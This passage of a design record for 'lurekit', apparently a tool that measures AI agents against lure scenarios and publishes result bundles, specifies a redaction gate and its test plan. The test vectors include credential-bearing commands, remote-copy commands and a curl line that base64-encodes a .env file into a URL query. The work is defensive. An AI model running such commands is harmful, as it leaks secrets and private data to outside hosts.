    planned repetition(s); report.md cites evidence files that are not in the bundle`, publish
    continues;
  - `found == 0`: refused unless `--allow-no-evidence` is given. Error:
    `publish: no evidence files under <runDir> (0 of <expected> planned repetitions); a bundle
    without evidence cannot be audited; nothing written`, then
    `next: lurekit publish <runDir> --allow-no-evidence   (report-only copy, e.g. the shipped
    demo)`. With the flag the bundle is written, `index.md` gains a `## Evidence` section with
    the line `no evidence files published (--allow-no-evidence): 0 of <expected> planned
    repetition(s); the evidence lines in report.md cite files that are not in this bundle`, and
    stdout prints `evidence: 0 of <expected> file(s) (--allow-no-evidence)`. With `found > 0`
    the flag changes nothing. The shipped `demo/<id>` directory (manifest and report.json only)
    is the intended user of the flag; nothing under `reports/` or `demo/` is re-published;
  - a successful publish ends with `Next: lurekit report <outDir>` and the line
    `      cite it as described in the publishing guide ("Citing a bundle")`.
- **Schema descriptions (DOCS-03; prose only, ajv unaffected, no schema version change).**
  `schemas/manifest.schema.json`: the `excluded` description becomes "Published bundles only
  (publish --exclude, ADR-0017 \"Excluding a scenario\"): scenario ids whose results were left
  out because the operator declared them not a measurement. Each id is absent from results and,
  since the block-4 amendment, from corpus.scenario_ids; totals cover results only. Never written
  by the runner; not a disclosure hold (withheld ids are not recorded here)."; `corpus_digest_full`
  gains "Published reduced bundles only (ADR-0017 \"Corpus block of a reduced bundle\"): the run's
  original corpus_digest over the full corpus, kept when --withhold/--exclude dropped scenarios and
  corpus_digest was recomputed over the published ones. Absent from every manifest the runner
  writes and from a full bundle."
- **Entry-page wording (DOCS-14).** README.md ("Redaction gate" bullet), the launch article
  (`docs/launch/article-lurekit-2026-11.md`, the publish paragraph) and the "Limits" section of
  `docs/guide/publishing.md` describe the gate as this amendment does: raw transcripts and hook
  logs are never copied, and the gate fails, instead of rewriting, on any URL that is not exactly
  a scenario source URL (or on a host named with `--allow-host`), on internal and private
  addresses, on credential-shaped values (known token prefixes, bearer/JWT/PEM, credential
  assignments and flags, URL passwords, encoded blobs), on the values of the variables forwarded
  to the agent, and on home paths. The publishing guide's gate table gains the `credential` and
  `env_value` rows and the extended `host`/`git_ssh` rules.
- **Deferred, recorded: `--tool-inputs digest`.** An opt-in that replaces tool-call inputs by
  their digests for a run on a host that is not inert is not built in B12. It alters published
  facts (Option 2 of this ADR) and needs its own `index.md` note, schema field and reader
  guidance before it exists; it is never the default.

Operator-visible: a bundle naming a forwarded variable's value, a credential assignment, flag,
URL password or encoded blob, a private IPv6 or `user@<ip>:` remote, or a single-label
`host:port` now fails with the kinds above (the override for a host is `--allow-host`; there is
none for a credential or an operator value: fix the evidence or do not publish that run); a run
dir without evidence files needs `--allow-no-evidence`; new runs store the three detector paths
relative to the run dir.

Test plan (block B12; `test/publish-gate.test.ts`, `test/publish.test.ts`, `test/runner.test.ts`;
offline, credential-shaped vectors assembled at runtime, never literal):
- B12-T1 gate positives, one per shape, each asserting the kind and that the detail does not
  contain the value: the SECURITY-01 strings (`mysql -u root -pS3cret...`,
  `export DB_PASSWORD=...`, `{"requested":"/c/tok?k=<base64 blob>"}`), `--password=...`,
  `sshpass -p ...`, `"API_TOKEN": "..."` (JSON member), `http://admin:...@127.0.0.1:8080/`
  (loopback userinfo), a 40-hex blob in a loopback URL query, a blob inside
  `detector_hits[].matched.args` (structural), `scp . deploy@10.0.0.5:/srv`,
  `ssh deploy@10.0.0.5`, `::ffff:10.0.0.7`, `rsync -a . backup@10.20.30.40:/mnt` (`git_ssh` on a
  public IPv4), `fd12:3456::1`, `fe80::1`, `[fd12::1]:22`, `ssh user@fd12:3456::1`,
  `curl gitlab:8443/api`, `redis:6379`.
- B12-T2 gate negatives (no finding): `mkdir -p dir`, `claude -p "task"`, `find . -print`,
  `TOKEN=$GITHUB_TOKEN`, `PASSWORD=<canary-token-1>`, `API_KEY=xxxxxxxxxxxx`,
  `"token": "<canary-token-2>"`, `canary-token rewrite`, `scenario_version: sha256:<64 hex>`
  and `input_digest` values (digests at their keys), a Markdown anchor of 40+ lower-case
  characters and hyphens in a URL fragment, a git commit SHA in a source-URL path,
  `ping 203.0.113.9` (public IPv4, no port: unchanged decision), `::1`, `at 12:30`, `C:123`,
  `retry:3`, `"port":8080`, `file.ts:12`, `localhost:3000`, a global IPv6 literal
  (`2001:db8::1`), the `curl ...?k=$(cat .env | base64)` command text.
- B12-T3 `env_value`: with `operatorEnv` `{ ANTHROPIC_API_KEY: <runtime-built 24-char value> }`
  and an evidence record whose `env_forwarded` lists the name, each spelling (raw, JSON-escaped,
  percent-encoded, base64, base64url, unpadded) in a tool-call input is one finding naming the
  variable and not the value; the same value under a name absent from `env_forwarded`, under a
  `BASE_ENV_ALLOW` name (`PATH`), under an `ENV_VALUE_EXEMPT` name, a 7-character value, and a
  value equal to `profile.model` give no finding; a bundle whose records carry no
  `env_forwarded` (replay) gives no finding whatever `operatorEnv` holds.
- B12-T4 settings env: `readRunDir` reads `<id>/<rep>/claude-settings.json` `env` values into
  `settingsEnv`, skips a symlinked file with the existing warning text, fails closed on invalid
  JSON, and reads nothing for a withheld or excluded scenario (the file is still never in
  `plan.files`).
- B12-T5 re-gating: every committed bundle under `reports/` and `demo/` still yields zero
  findings with the new patterns (existing `it.each`), and `gateAllowFor` unchanged.
- B12-T6 relative paths: a runner test with the `canary_command` and `canary_file_read`
  detectors asserts the written `detector_hits[].matched.binDir`, `.recorderPath` and `.path`
  do not start with the run dir and resolve to existing files when joined to it; a decoy under an
  explicit `--workdir` base outside the run dir keeps its absolute path; `tool_calls[].input` is
  byte-identical to the observation; the replay run of `claude-sample` scores as before
  (`test/run-lifecycle.test.ts` identity test unchanged).
- B12-T7 evidence count: `planPublish` with 1 evidence file for `runs: 3` returns `ok: true`
  with the warning text in `plan.warnings`; with zero evidence files and no flag returns
  `ok: false` with the error and `next:` text and `leaks: []`; with `allowNoEvidence: true` the
  plan writes `index.md` with the `## Evidence` section and no `<id>/<rep>/evidence.json`; the
  CLI prints the stdout line and the `Next:` lines; `lurekit publish demo/<id> --out <scratch>`
  refuses without the flag and succeeds with it (the existing demo bundle on disk is never
  touched).
- B12-T8 `--allow-no-evidence` with evidence present changes no output byte of the bundle
  (compare `plan.files` with and without the flag).
- B12-T9 schema descriptions: `manifest.schema.json` still validates every committed
  `manifest.json` (existing tests) and the `excluded` description no longer contains "stays in".
- B12-T10 docs: a test greps README.md, the launch article and `docs/guide/publishing.md` for
  the old phrase "keeps those inputs safe" / "non-allowlisted hosts, credential-shaped tokens and
  home paths" (must be absent) and for `env_value` and `credential` in the publishing guide's
  gate table (must be present).
- Existing: `test/publish.test.ts` fixtures that build `RunDirContents` with fewer evidence
  files than `results[].runs` now see the count warning; assertions on exact stderr are updated,
  and fixtures with no evidence pass `allowNoEvidence: true` or gain one file. Verification
  commands of the block: `npx vitest run test/publish-gate.test.ts test/publish.test.ts`,
  the review repro scripts (`gate-check.mjs`, `sec05.mjs`, run against this build) must BLOCK the
  mysql, scp, `::ffff:`, `fd12::` and base64-query cases, `node dist/cli.js publish
  demo/aab-20261103071018-88a78d8f --out <scratch>` must refuse without `--allow-no-evidence`,
  and `lurekit report <bundle>` must still render every bundle under `reports/`.

## Consequences
- A published number always ships with its manifest and evidence, and never with transcripts.
- The gate is a heuristic, not a proof of absence: a token with no known prefix, or a path
  outside a home root, passes. Raising the bar means extending `SECRET_PATTERNS` (which also
  tightens fixture inertness) or the home-root list here, in the same change as this ADR.
- Runs whose workdir sits under the home dir will fail the gate when evidence tool-call inputs
  name workdir paths. Since ADR-0002 "Per-run workdir", workdirs live under `--results` by
  default (never the OS temp dir), so a results dir under home triggers this. That is intended:
  the maintainer decides, by re-running with `--results` or a `--workdir` base outside home,
  using `--redact-home`, or fixing the evidence.
- `--redact-home` is a narrow, explicit exception to "the gate never rewrites" (Option 2 stays
  rejected as a default). It is opt-in because rewriting changes published bytes (§6: a
  reporter alters no facts), so the maintainer must ask for it per publish, and the bundle
  says so (`index.md` note with the count) so a reader knows `<HOME>` is a substitution, not
  what the agent saw. The rewrite is a pure substitution of one known string: the path
  structure below it (e.g. `<HOME>/.claude/projects/<slug>/memory/`) is kept, which is what an
  auditor needs, and the source run dir keeps the exact bytes for local audit.
- It covers only the operator's own home because that is the one value the tool knows to be
  the publisher's, and the case it exists for (a live run naming the home the agent runtime
  itself announced) is always that home. Another user's home, a macOS/Windows home that is not
  the operator's, or a sibling such as `/home/u2` or `/home/u@old` is evidence the run captured something
  unexpected; masking it would hide that from the maintainer, so it keeps failing the gate.
- The bare-username check is deliberately blunt. A username that is also a common word or
  part of a version string (e.g. a distribution name that matches the login) fails the publish
  even where it is not a path (with home `/root`, the word `root` in `uid=0(root)`; with
  `/home/test`, the word `test`). The slug match is not blunt in this way: it needs the
  separator-joined form, or the leading `-` for a single-segment home. The maintainer then sees the file and decides (fix the evidence,
  or do not publish that run). It is a backstop for spellings the gate does not know, not a
  substitute for them, which is why the encoded forms are matched and rewritten explicitly.
- Operator MCP server names are rewritten unconditionally, not opt-in, unlike `--redact-home`.
  The two differ in what the value is to the measurement. A home path can be evidence (what the
  agent touched), so rewriting it alters a published fact and the maintainer must ask. The names
  of the operator's own servers are never part of the measurement: a scenario's precondition
  (`expect: mcp_server`, §4.3) names a fixture server, which arrives as `dynamic` or `project`
  and is kept. What the published record still needs from operator entries (that they existed,
  how many, their status and their source class, e.g. to see that strict MCP isolation was not
  in effect) survives the rewrite. Making it opt-in would publish the operator's connector list
  by default, which no reader needs. The bytes in the run dir are unchanged for local audit.
- Harness canary tokens are rewritten unconditionally, like operator MCP server names and unlike
  `--redact-home`: the value is the tool's own per-run secret, never an observed fact, so masking
  it changes no published finding. Replacement is by exact value, substring-wide, so a token is
  caught wherever it was echoed; it is guarded by a canary shape so a real agent command or a
  digest is never touched, and the `index.md` count tells a reader `<canary-token-N>` is a
  substitution. A bundle published before this amendment still carries its raw tokens until the
  run is re-published; the committed `reports/` tree is historical and `.gitleaks.toml` does **not**
  allowlist it, so a re-publish (not an allowlist) is what makes it clean. The gate still runs
  afterwards, so a token with an unknown canary shape that this step missed is only caught if it
  also matches a `SECRET_PATTERNS` family.
- The rewrite covers only the structured `mcp_servers` field. If the agent actually called a
  tool of an operator server, its `mcp__<server>__<tool>` name in `tool_calls` is a fact of the
  run and is published as is; a maintainer who must not disclose it should not publish that run.
- Evidence records are published verbatim (save for operator MCP server names, harness canary
  tokens and `--redact-home`), including tool-call inputs: they are the audit proof. The gate is
  a deny-list of known shapes, operator values and home paths checked over every published byte
  (block B12 amendment, "What the gate checks, stated plainly"), not a proof that an input is
  safe; the maintainer reads the evidence of an unusual run before publishing it.
- `--withhold` changes the published numbers on purpose: the bundle's headline is over the
  published scenarios only, and the `## Withheld` section says how many were held back, so a
  reader does not mistake the reduced totals for the whole run. It is the maintainer's choice
  per publish, like every other exception here; the tool does not read `source.fix_status` to
  decide it, because the manifest does not carry it and the 90-day clock is a policy date the
  maintainer owns (ADR-0014). Once the window closes, re-publishing the same run without the
  flag yields the full bundle, since the run dir was never changed.
